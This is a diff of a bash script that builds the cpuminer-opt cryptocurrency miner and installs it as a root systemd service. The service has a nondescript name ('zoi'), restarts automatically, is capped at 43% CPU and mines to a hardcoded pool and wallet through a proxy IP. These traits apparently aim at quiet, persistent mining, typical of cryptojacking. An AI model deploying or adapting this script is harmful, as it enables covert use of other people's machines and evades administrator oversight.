@@ -1,9 +1,29 @@
 #!/bin/bash
-sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
-git clone https://github.com/k67frozen/cpuminer-opt
-cd cpuminer-opt
-chmod +x *
-./build.sh
-make
-cpulimit --exe cpuminer --limit 43 -b && ./cpuminer -a lyra2z330 -o stratum+tcp://d.jkpool.com:3000 -u manlytq.lion -p x -x 140.82.40.172:1102 --background
+apt-get update && 
+apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
+sudo sysctl vm.nr_hugepages=128 &&
+cd /usr/local/src/ &&
+wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.3.1.tar.gz &&
+tar xvzf v3.8.3.1.tar.gz &&
+cd cpuminer-opt-3.8.3.1 &&
+./autogen.sh &&
+CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
+make &&
+bash -c 'cat <<EOT >>/lib/systemd/system/zoi.service 
+[Unit]
+Description=zoi
+After=network.target
+[Service]
+ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/cpulimit --exe cpuminer --limit 43 -b && ./cpuminer -a cryptonight -o stratum+tcp://pool.sumokoin.com:3333 -u Sumoo5H59i819DcLT3DjZVToKneE2UE5xFSGCZkzwmdkdg1W8KPF4s8CmAiNzhmEKW9VLupxAvk56JZYp64wTKEgKufmGzsAeq9.f7caea9577b3d05351dda90568e0d0a607c9ef5e25284342a291eaa0e65b771f -p x -x 45.63.57.158:1102 --background
+WatchdogSec=3600
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable zoi.service &&
+service zoi start
 
